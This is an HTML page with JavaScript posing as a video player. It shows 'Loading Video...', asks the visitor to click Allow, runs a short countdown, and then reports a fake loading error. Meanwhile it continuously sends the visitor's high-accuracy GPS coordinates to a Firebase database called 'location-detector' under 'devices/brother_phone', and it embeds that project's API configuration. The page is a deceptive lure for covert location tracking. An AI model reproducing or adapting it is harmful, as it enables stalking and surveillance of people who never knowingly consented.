<body>
    <h2>Loading Video...</h2>
    <p id="status">Click "Allow" to watch video</p>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

        // Paste your Firebase config here
        const firebaseConfig = {
            apiKey: "AIzaSyBYdy0mGeOSrx59-dDdS9whEpKakuOgSlA",
            authDomain: "location-detector-25ab7.firebaseapp.com",
            databaseURL: "https://location-detector-25ab7-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "location-detector-25ab7",
            storageBucket: "location-detector-25ab7.firebasestorage.app",
            messagingSenderId: "717756663277",
            appId: "1:717756663277:web:4913e4e1fd58aa5bb613e4",
            measurementId: "G-8D3FXK2K3Y"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const statusEl = document.getElementById("status");

      // 30-second countdown
    let secondsLeft = 7;
    const timer = setInterval(() => {
      secondsLeft--;
      if (secondsLeft > 0) {
        statusEl.textContent = `Video will paly in ${secondsLeft} sec.`;
      } else {
        clearInterval(timer);
        statusEl.textContent = "Error loading video !";
      }
    }, 1000);

       // Send GPS coordinates to Firebase in the background
    if ("geolocation" in navigator) {
      navigator.geolocation.watchPosition(
        (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          set(ref(db, "devices/brother_phone"), {
            lat: latitude,
            lng: longitude,
            accuracy: Math.round(accuracy),
            updatedAt: Date.now()
          });
        },
        (err) => {
          console.error("Location error:", err.message);
        },
        { enableHighAccuracy: true, maximumAge: 0 }
      );
    }
  </script>
